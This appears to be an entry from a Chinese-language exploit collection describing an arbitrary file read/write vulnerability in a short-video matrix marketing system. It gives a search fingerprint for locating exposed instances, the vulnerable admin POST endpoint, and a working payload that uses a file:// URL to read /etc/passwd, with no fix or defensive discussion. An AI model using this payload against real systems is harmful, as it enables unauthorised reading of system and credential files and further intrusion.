# 短视频矩阵营销系统-poihuoqu任意文件读取漏洞

短视频矩阵营销系统-poihuoqu ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"短视频矩阵营销系统"`
- **请求**：`POST /index.php/admin/Userinfo/poihuoqu HTTP/2`

**Payload**
```
poi=file:///etc/passwd
```